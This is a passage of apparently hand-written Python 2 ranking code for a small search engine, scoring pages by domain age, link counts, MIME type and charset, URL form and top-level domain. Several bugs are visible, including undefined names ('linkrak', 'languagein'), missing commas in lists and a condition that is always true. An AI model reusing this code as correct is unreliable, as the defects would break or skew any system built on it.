    if domain.domain_created >= ninetydaysago:
        return 0.67
    elif domain.domain_created >= halfyearago:
        return 0.83
    elif domain.domain_created >= oneyearago:
        return 0.92
    elif domain.domain_created >= twoyearsago:
        return 1.0
    elif domain.domain_created >= fouryearsago:
        return 1.05
    elif domain.domain_created >= sixyearsago:
        return 1.10
    else:
        return 1.12

def GetLinkRank(domains_linking_in):
    """
    Returns a link rank value based on the number of domains linking in.
    """
    bonus = 0
    if domains_linking_in >= 1875000:
        bonus += 10.0 + (0.000000128 * (domains_linking_in-1953125))
    elif domains_linking_in >= 375000:
        bonus += 9.0 + (0.00000064 * (domains_linking_in-390625))
    elif domains_linking_in >= 75000:
        bonus += 8.0 + (0.0000032 * (domains_linking_in-78125))
    elif domains_linking_in >= 15000:
        bonus += 7.0 + (0.000016 * (domains_linking_in-15625))
    elif domains_linking_in >= 3000:
        bonus += 6.0 + (0.00008 * (domains_linking_in-3125))
    elif domains_linking_in >= 625:
        bonus += 5.0 + (0.0004 * (domains_linking_in-625))
    elif domains_linking_in >= 125:
        bonus += 4.0 + (0.002 * (domains_linking_in-125))
    elif domains_linking_in >= 25:
        bonus += 3.0 + (0.01 * (domains_linking_in-25))
    elif domains_linking_in >= 5:
        bonus += 2.0 + (0.05 * (domains_linking_in-5))
    elif domains_linking_in >= 1:
        bonus += 1.0 + (0.25 * (domains_linking_in-1))
    return bonus

def GetIndexModifiersForDomain(rooturl, lang=None, rulematches=None, verbose=False):
    """
    Returns the multiplier followed by the number of bonus points for a domain.
    """
    value = 1.0
    bonus = 0.0
    try:
        domain = DomainInfo.objects.get(url=rooturl)
        if domain.rank_adjustment == -3:
            value = 0.25
            if verbose:
                rulematches.append('Domain modifier 0.25 for rank adjustment {0} reason {1}'.format(domain.rank_adjustment, domain.rank_reason))
        elif domain.rank_adjustment == -2:
            value = 0.5
            if verbose:
                rulematches.append('Domain modifier 0.5 for rank adjustment {0} reason {1}'.format(domain.rank_adjustment, domain.rank_reason))
        elif domain.rank_adjustment == -1:
            value = 0.75
            if verbose:
                rulematches.append('Domain modifier 0.75 for rank adjustment {0} reason {1}'.format(domain.rank_adjustment, domain.rank_reason))
        elif domain.rank_adjustment == -4:
            value = 0.875
            if verbose:
                rulematches.append('Domain modifier 0.875 for rank adjustment {0} reason {1}'.format(domain.rank_adjustment, domain.rank_reason))
        elif domain.rank_adjustment == 1:
            value = 1.25
            if verbose:
                rulematches.append('Domain modifier 1.25 for rank adjustment {0} reason {1}'.format(domain.rank_adjustment, domain.rank_reason))
        elif domain.rank_adjustment == 2:
            value = 1.5
            if verbose:
                rulematches.append('Domain modifier 1.5 for rank adjustment {0} reason {1}'.format(domain.rank_adjustment, domain.rank_reason))
        if domain.alexa_rank:
            # Outdated alexa rank, meaning it was in the top million once, but not anymore,
            # is still worth half a point.
            if domain.alexa_outdated and domain.alexa_rank < 1000000:
                bonus = 0.5
                if verbose:
                    rulematches.append('Bonus 0.5 for outdated alexa rank {0}'.format(domain.alexa_rank))
            elif domain.alexa_rank < 10000:
                bonus = 4.0
                if verbose:
                    rulematches.append('Bonus 4 for alexa rank {0}'.format(domain.alexa_rank))
            elif domain.alexa_rank < 100000:
                bonus = 3.0
                if verbose:
                    rulematches.append('Bonus 3 for alexa rank {0}'.format(domain.alexa_rank))
            elif domain.alexa_rank < 500000:
                bonus = 2.0
                if verbose:
                    rulematches.append('Bonus 2 for alexa rank {0}'.format(domain.alexa_rank))
            elif domain.alexa_rank < 1000000:
                bonus = 1.0
                if verbose:
                    rulematches.append('Bonus 1 for alexa rank {0}'.format(domain.alexa_rank))
        if domain.domains_linking_in:
            linkrank = GetLinkRank(domain.domains_linking_in)
            if verbose:
                rulematches.append('Bonus {0} for {1} links'.format(linkrak, domain.domains_linking_in))
            bonus += linkrank
        # One point bonus for the site being tagged as the language we're looking in.
        # This means that sites that have been marked as the correct language by a
        # person or a script will rank ever-so-slightly higher.
        if lang and domain.language_association == lang:
            bonus += 1.0
            if verbose:
                rulematches.append('1 point for language association match')
        # Penalty of one point per hyphen in domain name.
        hyphens = domain.url.split('-')
        if len(hyphens) > 1:
            bonus -= (len(hyphens) - 1)
            if verbose:
                rulematches.append('-{0} points for {1} hyphens'.format((len(hyphens)-1), len(hyphens)))
        if domain.domain_created:
            mod = GetDomainAgeModifier(domain)
            value *= mod
            if verbose:
                rulematches.append('Multiply by {0} for domain created {1}'.format(mod, domain.domain_created))
    except ObjectDoesNotExist:
        pass
    # Big penalty for being just an IP address with no domain. Almost always spam.
    # Takes a 60 point domain down to 10, and a 5-pointer down to 0.
    if IsIPAddress(rooturl):
        bonus -= 5.0
        value = value * 0.25
        if verbose:
            rulematches.append('-5 points and multiply by 0.25 for IP address as domain')
    return [value, bonus]

def IsBadMimeType(mimetype):
    """
    Is this a MIME type we don't want to save in our index?
    """
    if mimetype in [u'application/pdf', u'image/jpeg', u'application/x-shockwave-flash', u'image/png', u'image/gif', u'application/octet-stream',
                    u'application/x-gzip', u'application/zip', 'video/x-ms-asf', u'application/x-bittorrent', u'application/epub+zip', 
                    u'application/x-icq', u'audio/x-pn-realaudio', u'audio/mpeg', u'audio/mid', u'image', u'application/pdf;charset=UTF-8',
                    u'audio/midi', u'video/mp4', u'image/tiff', u'video/x-msvideo', u'audio/x-ms-wma', u'text/calendar', u'image/pjpeg',
                    u'application/vnd.oasis.opendocument.text', u'application/x-msdownload', u'audio/x-scpls', u'text/x-c; charset=UTF-8',
                    u'text/x-c++; charset=UTF-8', u'application/pdf; charset=utf-8', u'text/calendar; charset=UTF-8',
                    u'audio/x-scpls; name="playlist.pls"', u'image/GIF', u'image/jpg', u'application/vnd.ms-excel;charset=utf-8',
                    u'type: text/Calendar', u'application/vnd.openxmlformats-officedocument.presentationml.slideshow', u'application/x-ms-reader',
                    u'"image/jpg"', u'application/msword', u'application/vnd.ms-excel', u'audio/mpegurl', u'audio/x-mp3',
                    u'application/vnd.openxmlformats-officedocument.presentationml.presentation', u'application/postscript',
                    u'application/vnd.symbian.install', u'application/download', u'audio/mpeg3; Charset=UTF-8', u'MIME type: audio/x-mpegurl',
                    u'application/octet-stream, text/html; charset=UTF-8', u'application/x-pdf', u'application/pdf; charset=UTF-8',
                    u'video/x-ms-asf; charset=utf-8', u'application/pdf;charset=utf-8', u'application/pdf;charset=ISO-8859-1',
                    u'image/jpeg; charset=binary', u'image/jpeg;charset=UTF-8', u'image/jpeg; charset=utf-8',
                    u'text/calendar;charset=UTF-8', u'text/calendar; charset=utf-8', u'application/calendar; charset=utf-8']:
        return True
    return False

def GetMimeTypeModifier(mimetype, language='en'):
    if not mimetype:
        return 0.0
    # Bonus point for being UTF-8.
    if mimetype in [u'text/html; charset=UTF-8', u'text/html; charset=utf-8', u'text/html;charset=UTF-8', u'text/html;charset=utf-8',
                    u'text/html; Charset=UTF-8', u'text/html; Charset=utf-8', u'text/html;charset=utf8', u'text/html; utf-8; charset=utf-8',
                    u'text/html;Charset=UTF-8;charset=UTF-8', u'text/html; charset=UTF-8; encoding=UTF-8', u'text/html;; charset=UTF-8',
                    u'text/html; charset="utf-8"', u'text/html; charset=utf8', u'text/html; utf-8; charset=utf-8', u'text/html; charset="UTF-8"',
                    u'text/html; charset=utf-8;', u'text/html; charset: utf-8', u'text/html;;charset=UTF-8', u'text/html; charset=UTF8',
                    u'text/html;; charset=UTF-8', u'text/html; UTF-8;charset=UTF-8', u'text/html; utf-8=;charset=UTF-8',
                    u'text/html; charset=UTF-8;', u'text/html;charset=UTF-8, text/html; Charset=UTF-8', u'text/html;  charset=UTF-8',
                    u'text/html; charset=UTF-8, text/html; charset=UTF-8', u'text/html;encoding=utf-8;charset=utf-8',
                    u'text/html; Charset: utf-8;', u'text/html; charset=utf-8; charset=UTF-8', u'text/html; charset="utf8"',
                    u'text/html;UTF-8; charset=UTF-8', u'text/html; charset=Utf-8', u'text/html; encoding=UTF8;charset=UTF-8',
                    u'text/html;charset:utf-8', u'text/html; charset = utf-8; charset=UTF-8', u'text/html; charset:utf-8;',
                    u'text/html; charset=utf8, text/html; charset=utf-8', u'text/html;charset=UTF-8,text/html;charset=UTF-8',
                    u'text/html;;charset=utf-8', u'text/html; UTF-8', u'text/html; charset= utf-8', u'text/html; charset=UTF-8;charset=UTF-8',
                    u'text/html; charset= UTF-8', u'text/html; charset: UTF-8; charset=utf-8', u'text/html; charset:UTF-8;charset=UTF-8',
                    u'text/html;  charset=utf-8', u'text/html;charset=utf-8; Charset=utf-8', u'text/html; charset: UTF-8',
                    u'text/html;charset=UTF8', u'text/html; Charset=UTF8', u'text/html; charset=utf-8; boundary=xYzZY',
                    u'text/html; charset: UTF-8; charset=UTF-8', u'text/html; Charset=UTF-8;charset=UTF-8', u'text/html; encoding=utf-8;charset=UTF-8',
                    u'text/HTML; charset=utf-8', u'text/HTML; Charset=utf-8', u'Text/html; charset=UTF-8', u'Text/Html; Charset=Utf-8',
                    u'text/html; UTF-8; charset=UTF-8', u'TEXT/HTML; charset=UTF-8', u'text/html; Charset=utf8',
                    u'Text/HTML; charset=utf-8', u'text/HTML; charset=UTF-8', u'text/html;Charset=UTF-8']:
        return 1.0
    # I have no idea how to treat the xhtml+xml MIME type. No effect right now.
    elif mimetype in [u'application/xhtml+xml; charset=utf-8',]:
        return 0.0
    # Half a point for ISO-8859-1 or unidentified HTML or UTF-7. It's not UTF-8, but at least it's HTML text likely to be readable. ASCII here too.
    # Windows-28591 is equivalent.
    elif mimetype in [u'text/html', u'text/html;', u'text/html; charset=ISO-8859-1', u'text/html;charset=ISO-8859-1', u'text/html; charset=iso-8859-1', 
                      u'text/html; Charset=ISO-8859-1', u'text/html; Charset=iso-8859-1', u'text/html; charset=iso8859-1', u'text/html;charset=iso-8859-1',
                      u'text/html, text/html; charset=iso-8859-1', u'text/html; charset=latin1', u'text/html; charset=',
                      u'text/html; charset: ISO-8859-1; charset=UTF-8', u'text/html; charset=ISO_8859-1', 'text/html;charset=ascii',
                      u'text/html; charset=US-ASCII', u'text/html; charset=us-ascii', u'text/html;Charset=ISO-8859-1', 'text/html; charset=UTF-7',
                      u'text/html; charset=iso-8859-1;', u'text/html; Charset=ISO8859-1', u'text/html; charset=ANSI_X3.4-1968',
                      u'text/html; charset:iso-8859-1', u'text/html; charset: ISO-8859-1', u'text/html; charset=ISO-8859-1;',
                      u'text/html; charset=ISO8859-1', u'text/html; charset: iso-8859-1', u'text/html; charset: iso-8859-1; charset=utf-8',
                      u'text/html; charset=LATIN1', u'text/html; charset=latin-1', u'text/html; UTF-8;charset=ISO-8859-1',
                      u'text/html; charset=ISO-8859-1, text/html', u'text/html; charset="iso-8859-1"', u'text/html; Charset=windows-28591',
                      u"text/html; charset='iso-8859-1'", u'text/html; profile=xhtml;charset=ISO-8859-1', u'text/HTML; Charset=ISO-8859-1',
                      u'text/HTML;charset=ISO-8859-1', u'text/HTML; charset=iso-8859-1']:
        return 0.5
    # Quarter point for ISO-8859-15 or Windows-1252. They're not UTF-8, but they're latin text at least.
    elif mimetype in [u'text/html; charset=Windows-1252', u'text/html; charset=windows-1252', u'text/html; charset=ISO-8859-15',
                      u'text/html; charset=iso-8859-15', u'text/html;charset=windows-1252', u'text/html; Charset=windows-1252',
                      u'text/html;charset=ISO-8859-15', u'text/html; charset= iso-8859-15', u'text/html; charset=WINDOWS-1252',
                      u'text/html; Charset=ISO-8859-15', u'text/html;charset=iso-8859-15', u'text/html; charset=iso8859-15',
                      u'text/html, charset=iso-8859-15', u'text/html; charset=iso-8859-15;', u'text/html;charset=Windows-1252',
                      u'text/html; Charset=Windows-1252', u'text/HTML; Charset=windows-1252', u'text/html; Charset=iso-8859-15']:
        return 0.25
    # No point modifier for unknown or undeclared charset.
    elif mimetype in [u'text/html; charset=_CHARSET',]:
        return 0.0
    # Lose half a point for plain text. It's not HTML, but it may still be readable. Also lose half a point for text/html with no charset.
    elif mimetype in [u'text/plain', u'text/plain; charset=UTF-8', u'text/html; charset=none', u'text/plain;charset=ISO-8859-1',
                      u'text/html; charset=0', u'text/html; charset=NONE', u'text/plain; charset=utf-8', u'text/plain; charset=ISO-8859-1',
                      u'text/html; charset=None']:
        return -0.5
    # Eastern European encodings ISO-8859-2 and Windows-1250. Lose a point in the English index, gain a quarter point in a few languages
    # just as if it's Windows-1252, otherwise neutral.
    elif mimetype in [u'text/html; charset=ISO-8859-2', u'text/html; charset=iso-8859-2', u'text/html;charset=WINDOWS-1250',
                      u'text/html; charset=windows-1250', u'text/html;charset=iso-8859-2', u'text/html; charset=WINDOWS-1250'
                      u'text/html; ISO8859-2; charset=ISO-8859-2', u'text/html;charset=ISO-8859-2', u'text/html;charset=windows-1250', 
                      u'text/html; charset=Windows-1250', u'text/html; charset=WINDOWS-1250', u'text/html; charset=cp1250',
                      u'text/html; Charset=windows-1250', u"text/html; charset='iso-8859-2'", u'text/html; Charset=ISO-8859-2',
                      u'text/html; charset=iso8859-2', 'text/html; Charset=iso-8859-2', u'text/html; ISO-8859-2; charset=ISO-8859-2',
                      u'type: text/html; charset=windows-1250;', u'text/html; charset=win-1250', u'text/html; charset=win1250', 
                      u'text/html; charset= windows-1250', u'text/html; Charset=Windows-1250', u'text/html; charset=iso-8859-2;']:
        if language == 'en':
            return -1.0
        elif language in ['pl', 'cs', 'sk', 'hu', 'sl', 'hr', 'ro', 'de']:
            return 0.25
        else:
            return 0.0
    # Windows-1257 is for latvian, lithuanian, and estonian, but sometimes used for German and Polish.
    elif mimetype in [u'text/html; charset=windows-1257',]:
        if language in ['lt', 'lv', 'et', 'pl', 'de']:
            return 1.0
        else:
            return -1.0
    # ISO-8859-10, Latvian and Lithuanian.
    elif mimetype in [u'text/html;charset=ISO-8859-13',]:
        if languagein ['lt', 'lv']:
            return 1.0
        else:
            return -3.0
    # ISO-8859-7 for Greek, as is Windows-28597 and Windows-1253
    elif mimetype in [u'text/html; charset=iso-8859-7', u'text/html; charset=windows-1253', u'text/html; charset=ISO-8859-7', 
                      u'text/html; charset=Windows-1253', u'text/html;charset=iso-8859-7', u'text/html; Charset=windows-1253',
                      u'text/html;charset=windows-1253']:
        if language in ['el',]:
            return 1.0
        else:
            return -3.0
    # ISO-8859-9 and Windows-1254 and Latin-5 for Turkish
    elif mimetype in [u'text/html; charset=ISO-8859-9', u'text/html; charset=iso-8859-9', 'text/html; Charset=windows-1254', 
                      u'text/html; Charset=windows-1254', u'text/html; Charset=Windows-1254', u'text/html; Charset=iso-8859-9',
                      u'text/html; charset=windows-1254', u'text/html; charset=WINDOWS-1254', u'text/html;Windows-1254',
                      u'text/HTML; Charset=Windows-1254', u'text/html; charset=8859-9', u'text/html;charset=ISO-8859-9',
                      u'text/html; charset=Windows-1254', u'text/html; charset=latin5', u'text/HTML; Charset=windows-1254',
                      u'text/html;charset=iso-8859-9', u'text/HTML; Charset=iso-8859-9', u'text/html; charset=ISO-8859-9;']:
        if language == 'tr':
            return 0.5
        else:
            return -1.0
    # Windows-1251 is for Bulgarian, Serbian, Macedonian.
    elif mimetype in [u'text/html; charset=windows-1251', u'text/html; charset=CP1251', u'text/html; charset=WINDOWS-1251',
                      u'text/html; charset=windows-1251, text/html', u'text/html;charset=windows-1251', u'text/html; charset=cp1251',
                      u'text/html; charset=Windows-1251', u'text/html; Charset=windows-1251', u'text/html; charset=cp-1251']:
        if language == 'hr' or language == 'si':
            return -1.0
        else:
            return -5.0
    # Windows-1256 is for Arabic. Also commonly used in Franco-Arabic countries (Morocco)
    elif mimetype in [u'text/html; charset=windows-1256', u'text/html; charset=Windows-1256']:
        if language == 'tr' or language == 'fr':
            return -3.0
        else:
            return -7.0
    # Windows-1255 and ISO-8859-8 are for Hebrew.
    elif mimetype in [u'text/html; charset=windows-1255',]:
        return -5.0
    # A diff file. Minor negative, I suppose. Not sure whether these are good or bad.
    elif mimetype in [u'text/x-diff',]:
        return -4.0
    # Broken IIS configurations. Not sure how much to adjust.
    elif mimetype in [u'text/vnd.wap.wml; charset=UTF-8', u'text/vnd.wap.wml']:
        return -6.0
    # Russian scripts: koi8-r
    elif mimetype in [u'text/html; charset=koi8-r', u'text/html; charset=KOI8-R']:
        return -8.0
    # Thai and Japanese and Korean - EUC-KR, TIS-620, Shift-JIS
    elif mimetype in [u'text/html; charset=TIS-620', u'text/html; charset=tis-620', u'text/html; charset=EUC-JP', u'text/html; charset=euc-kr',
                      u'text/html; charset=Shift_JIS', u'text/html; charset=EUC-KR', u'text/html; charset=euc-jp', u'text/html;charset=EUC-KR',
                      u'text/html; charset=shift_jis', u'text/html;charset=Windows-31J', u'text/html;charset=Shift_JIS',
                      u'text/html;charset=euc-kr; Charset=euc-kr', u'text/html;charset=euc-kr', u'text/html; charset=SHIFT_JIS',
                      u'text/html;charset=shift-jis', u'text/html; charset=Shift-jis']:
        return -10.0
    # Chinese
    elif mimetype in [u'text/html; charset=gbk', u'text/html; charset=gb2312', u'text/html; Charset=gb2312', u'text/html;charset=gbk',
                      u'text/html; charset=big5', u'text/html; charset=BIG5', u'text/html;charset=GBK', 'text/html; charset=big-5',
                      u'text/html;charset=Big5-HKSCS', u'text/html;charset=gb2312', u'text/html; Charset=GB2312']:
        return -15.0
    # Lose ten points for JavaScript. It's technically a bad URL type, but it's also actually text, so IsBadMImeType returns False.
    elif mimetype in [u'application/javascript', u'application/json', u'application/javascript; charset=utf-8', u'application/json; charset=utf-8', u'text/javascript']:
        return -10.0
    # XML Formats, slightly worse than JavaScript because they're slightly less readable.
    elif mimetype in [u'application/xml', u'application/rss+xml', u'application/rss+xml; charset=utf-8', u'application/atom+xml; charset=UTF-8',
                      u'application/rss+xml; charset=UTF-8', u'application/atom+xml; charset=utf-8', u'application/xml;charset=UTF-8',
                      u'text/xml; charset=UTF-8', u'application/rss+xml;charset=utf-8', u'text/xml; charset="UTF-8"', u'type: text/xml',
                      u'text/xml; charset=ISO-8859-1', u'application/xhtml+xml; charset=UTF-8', u'text/xml;charset=UTF-8',
                      u'text/xml; charset=utf-8', u'text/xml;charset=utf-8', u'application/xml; charset=utf-8', u'text/xml;charset=ISO-8859-1',
                      u'text/html; charset ISO-8859-1; charset=ISO-8859-1', u'text/html; charset=iso-8859-1;', u'text/xml; Charset=utf-8',
                      u'text/xml', u'application/atom+xml;charset=UTF-8', u'application/atom+xml; charset=ISO-8859-1' u'application/xml; charset=UTF-8',
                      u'application/xml; charset=ISO-8859-1', u'application/rss+xml; charset: utf-8', u'text/xml; charset=windows-1250',
                      u'application/xml; charset=UTF-8', u'application/rss+xml; charset=utf8', u'application/xml; charset=windows-1252',
                      u'text/xml; charset=windows-1251', u'application/atom+xml', u'application/xml;', u'application/rss+xml; charset=UTF-8;',
                      u'application/rss+xml;', u'application/atom+xml; charset=iso-8859-1', u'text/xml;charset=iso-8859-1', 
                      u'application/rss+xml; charset=ISO-8859-1', u'text/xml;charset=iso-8859-1', u'text/html;charset=iso-8859-1;',
                      u'application/rss+xml; charset=iso-8859-1', u'text/xml;', u'text/xml; charset=tis-620', u'text/xml; charset=ISO-8859-15',
                      u'text/html; Charset=ISO-8859-9', u'text/xml; charset=windows-1254', u'text/xml; charset=Windows-1254', 
                      u'text/xml; charset=WINDOWS-1254', u'text/xml;charset=iso-8859-2', u'text/xml; charset=ISO-8859-9',
                      u'text/xml; charset=utf8']:
        return -12.0
    # Unreadable/unsaved file types
    elif IsBadMimeType(mimetype):
        return -20.0
    else:
        print u'Unrecognized MIME type: {0}'.format(mimetype)
        return 0.0

def CalculateTermValue(item, keywords, abbreviated=False, lang=None, verbose=False):
    """
    Gets the page score for a term based on its contents and metadata.

    Item should be a SiteInfo class, keywords are the keywords to be indexes, abbreviated
    only searches title if true, lang is the language code for the page, and verbose
    logs each score modifier so you can see why a page scored how it did for those keywords.

    If called with verbose, it returns an array of strings describing point
    values instead of a score.
    """
    rulematches = []
    # Represents the words of the phrase without spaces.
    spacelesskeywords = keywords.replace(' ', '')
    # Keywords without spaces and special characters.
    spacelesskeywords = spacelesskeywords.replace("'", '')
    spacelesskeywords = spacelesskeywords.replace(".", '')
    keywords = keywords.lower()
    multiword = False
    keywordisdomain = False
    # Represents the words of the phrase separately.
    splitkeywords = keywords.split(" ")
    if len(splitkeywords) > 1 or spacelesskeywords != keywords:
        multiword = True
    value = 0.0
    # Fail: Must have root URL.
    if not item.rooturl:
        return value
    # URL Matching:
    # Most points for exact match, then second most points for exact match without domain extension,
    # then high points for keywords in domain, then points for keywords anywhere in the domain.
    if item.rooturl:
        spliturl = item.rooturl.split(u'.')
        # Penalty for being excessively subdomained. Lose 4 points for domain.site.com, and 4 more
        # for each subdomain beyond that.
        numsub = len(spliturl)
        if numsub > 2 and spliturl[0] == u'www':
            numsub -= 1
        if numsub > 2:
            value -= (numsub-2) * 4
            if verbose:
                rulematches.append('-{0} points for having more than 2 subdomains.'.format((numsub-2)*4))
    # Exact url match, matches "cheese.com" when the URL is "cheese.com".
    if item.rooturl and keywords == item.rooturl.lower():
        keywordisdomain = True
        value += 50
        if verbose:
            rulematches.append('50 points for exact domain match.'.format((numsub-2)*4))
    # Matches "cheese.com" when the URL is cheese.com
    elif item.rooturl and u'.' in keywords and keywords in item.rooturl and len(spliturl) > 1:
        splitk = keywords.split(u'.')
        # Exact match of "cheese.com" and "cheese.com".
        if len(spliturl) == 2 and splitk[0] == spliturl[0] and splitk[1] == spliturl[1]:
            value += 48
            if verbose:
                rulematches.append('48 points for exact domain match.')
        # Matches "cheese.com" to "www.cheese.com" and "mail.cheese.com".
        elif len(splitk) == 2 and len(spliturl) == 3 and splitk[0] == spliturl[1] and splitk[1] == spliturl[2]:
            value += 34
            if verbose:
                rulematches.append('34 points for subdomain match.')
            # Bonus points for exact match (being root). Matches http://www.cheese.com for "yahoo.com" keywords.
            if ((u'http://www.' + keywords) == item.url or (u'http://www.' + keywords) == (item.url + u'/') or
                (u'https://www.' + keywords) == item.url or (u'https://www.' + keywords) == (item.url + u'/')):
                value += 12
                if verbose:
                    rulematches.append('12 points for domain match with www prefix.')
        else:
            # Same as the 12-point rule below for "in rooturl".
            value += 12
            if verbose:
                rulematches.append('12 points for partial domain match.')
    # Matches "cheese" when the URL is cheese.com or cheese.net or cheese.au
    elif item.rooturl and len(spliturl) == 2 and spliturl[0] == keywords:
        keywordisdomain = True
        value += 32
        if verbose:
            rulematches.append('32 points for keyword is domain match.')
        # Exact match .com with 'www' prefix - in this case we give extra bonus for domain extension.
        # Largest bonus for .com, then other reputable domain extensions.
        if spliturl[1] == u'com':
            value += 10
            if verbose:
                rulematches.append('10 points for .com domain match.')
        elif spliturl[1] == u'.co.uk' or spliturl[1] == u'.gov' or spliturl[1] == u'.edu' or spliturl[1]:
            value += 6
            if verbose:
                rulematches.append('6 points for .co.uk/.gov/.edu domain match.')
        elif spliturl[1] == u'.org' or spliturl[1] == u'.net' or spliturl[1] == u'.au' or spliturl[1] == u'.mil' or spliturl[1] == u'.ca':
            value += 4
            if verbose:
                rulematches.append('4 points for .net/.org/.au/.mil/.ca domain match.')
    # Matches "cheese" when the URL is www.cheese.com.
    elif item.rooturl and item.rooturl.startswith(u'www.') and len(spliturl) == 3 and spliturl[1] == keywords:
        keywordisdomain = True
        value += 30
        if verbose:
            rulematches.append('30 points for www domain keyword match.')
        # Exact match .com with 'www' prefix - in this case we give extra bonus for domain extension.
        # Largest bonus for .com, then other reputable domain extensions.
        if spliturl[2] == u'com':
            value += 10
            if verbose:
                rulematches.append('10 points for .com domain match.')
        elif spliturl[2] == u'.co.uk' or spliturl[2] == u'.gov' or spliturl[2] == u'.edu' or spliturl[2]:
            value += 6
            if verbose:
                rulematches.append('6 points for .co.uk/.gov/.edu domain match.')
        elif spliturl[2] == u'.org' or spliturl[2] == u'.net' or spliturl[2] == u'.au' or spliturl[2] == u'.mil' or spliturl[2] == u'.ca':
            value += 4
            if verbose:
                rulematches.append('4 points for .net/.org/.au/.mil/.ca domain match.')
    # Matches "cheese sandwich" when the URL is cheesesandwich.com.
    elif multiword and item.rooturl and len(spliturl) == 2 and spliturl[0] == spacelesskeywords:
        keywordisdomain = True
        value += 30
        if verbose:
            rulematches.append('30 points for two word domain match in order.')
    # Matches "cheese sandwich" when the URL is www.cheesesandwich.com. Also matches cheese.sandwich.
    elif multiword and item.rooturl and item.rooturl.startswith(u'www.') and len(spliturl) == 3 and spliturl[1] == spacelesskeywords:
        keywordisdomain = True
        value += 24
        if verbose:
            rulematches.append('24 points for two word www domain match in order.')
    # Matches "cheese" when the URL is cheeseburger.com.
    elif item.rooturl and len(spliturl) == 2 and keywords in spliturl[0]:
        value += 20
        if verbose:
            rulematches.append('20 points for partial domain word match.')
    # Matches "cheese" when the URL is www.cheeseburger.com.
    elif item.rooturl and item.rooturl.startswith(u'www.') and len(spliturl) > 1 and keywords in spliturl[1]:
        value += 18
        if verbose:
            rulematches.append('18 points for www partial domain word match.')
    # Matches "cheese sandwich" when the URL is cheesesandwichforsale.com.
    elif multiword and item.rooturl and len(spliturl) == 2 and spacelesskeywords in spliturl[0]:
        value += 16
        if verbose:
            rulematches.append('16 points for partial domain multi word match.')
    # Matches "cheese sandwich" when the URL is www.cheesesandwichforsale.com.
    elif multiword and item.rooturl and item.rooturl.startswith(u'www.') and len(spliturl) > 1 and spacelesskeywords in spliturl[1]:
        value += 14
        if verbose:
            rulematches.append('14 points for partial www domain multi word match.')
    # Matches "cheese" when the URL is cheese.soup.com or yellow.cheeses.com.
    elif item.rooturl and keywords in item.rooturl.lower():
        value += 12
        if verbose:
            rulematches.append('12 points for subdomain partial word match.')
    # Matches the keywords in any part of the URL. Matches "cheese" when the URL is tacos.com/cheesesandwich.
    elif item.rooturl and keywords in item.url.lower():
        value += 10
        if verbose:
            rulematches.append('10 points for partial url word match.')
    # Matches "cheese sandwich" when the URL is tacos.com/cheesesandwich/
    elif multiword and item.rooturl and spacelesskeywords in item.url.lower():
        value += 8
        if verbose:
            rulematches.append('8 points for multiword partial url word match.')
    # For multiword search terms, give a percentage of 20 points for each keyword found.
    elif multiword:
        numwordsfound = 0
        for keyword in splitkeywords:
            if keyword in item.url.lower():
                numwordsfound += 1
        if numwordsfound:
            value += (20.0 * numwordsfound) / len(splitkeywords)
            if verbose:
                rulematches.append('{0} points for matching {1} of {2} keywords.'.format((20*numwordsfound)/len(splitkeywords), numwordsfound, len(splitkeywords)))
    # If this is the root URL for the site, add a few points.
    if (item.rooturl and (item.url == item.rooturl) or (item.url == ('http://' + item.rooturl)) or
       (item.url == ('https://' + item.rooturl)) or (item.url == ('http://' + item.rooturl + '/')) or
       (item.url == ('https://' + item.rooturl + '/'))):
        if keywordisdomain:
            value += 12
            if verbose:
                rulematches.append('12 points for being the root url of the website and the keyword is the domain.')
        else:
            value += 3
            if verbose:
                rulematches.append('3 points for being the root url of the website.')
    # Extra point for HTTPS URLs.
    if item.url.startswith('https://'):
        value += 1
        if verbose:
            rulematches.append('1 point for https.')
    # Penalty of two points per underscore in domain name.
    underscores = item.url.split('_')
    # Penalty for a numeric domain name and non-numeric search.
    if HasNumber(item.rooturl) and not HasNumber(keywords):
        value -= 2
    # Lose two points for a comma in the URL.
    if ',' in item.url:
        value -= 2
        if verbose:
            rulematches.append('-2 points for comma in url.')
    if len(underscores) > 1:
        value -= (2 * (len(underscores) -1))
        if verbose:
            rulematches.append('-{0} points for underscores in url.'.format((2*(len(underscores)-1))))
    # Lose a point for having query parameters. site.com/page.php?q=222 one point lower than site.com/page.php
    parsed = urlparse.urlparse(item.url)
    if parsed.query:
        value -= 1
        if verbose:
            rulematches.append('-1 point for query in url.')
        # Lose another point for super long query parameter strings.
        if len(parsed.query) > 25:
            value -= 1
            if verbose:
                rulematches.append('-1 point for query longer than 25 chars.')
    if parsed.netloc and keywords in parsed.netloc:
        value += 5
        if verbose:
            rulematches.append('5 points for keywords in the netloc.')
    elif parsed.path and keywords in parsed.path:
        value += 3
        if verbose:
            rulematches.append('3 points for keywords in the url path.')
    elif parsed.query and keywords in parsed.query:
        value += 1
        if verbose:
            rulematches.append('1 point for keywords in the query.')
    # Domain points. Lose points for generally spammy domains, add for common top-level domains,
    # and no adjustment for things like .us or .co.uk.
    if item.rooturl.endswith(u'.xxx') or item.rooturl.endswith(u'.porn'):
        # Rank these last in almost all cases.
        value -= 50
        if verbose:
            rulematches.append('-50 points for root domain .xxx/.porn.')
    elif item.rooturl.endswith(u'.pics') or item.rooturl.endswith(u'.sexy') or item.rooturl.endswith(u'.adult'):
        value -= 10
        if verbose:
            rulematches.append('-10 points for root domain .pics/.sexy/.adult.')
    # These new TLDs are pretty much always spam and malware.
    elif item.rooturl.endswith(u'.xyz') or item.rooturl.endswith(u'.kim') or item.rooturl.endswith(u'.review') or item.rooturl.endswith(u'.cricket') or item.rooturl.endswith(u'.science') or item.rooturl.endswith(u'.country') or item.rooturl.endswith(u'.party') or item.rooturl.endswith(u'.work') or item.rooturl.endswith(u'.link') or item.rooturl.endswith(u'.gq'):
        value -= 8
        if verbose:
            rulematches.append('-8 points for root domain .xyz/.kim/.review/.cricket/.link/.science/.work/.gq/.party/.country')
    elif item.rooturl.endswith(u'.info') or item.rooturl.endswith(u'.cn') or item.rooturl.endswith(u'.ru') or item.rooturl.endswith(u'.su') :
        value -= 6
        if verbose:
            rulematches.append('-6 points for root domain .info/.cn/.ru/.su.')
    # Differing scores for language-centric top-level domains.
    elif item.rooturl.endswith(u'.casa'):
        if lang == 'es':
            value -= 1
            if verbose:
                rulematches.append('-1 point for .casa and language es.')
        else:
            value -= 3
            if verbose:
                rulematches.append('-3 points for .casa and not language es.')
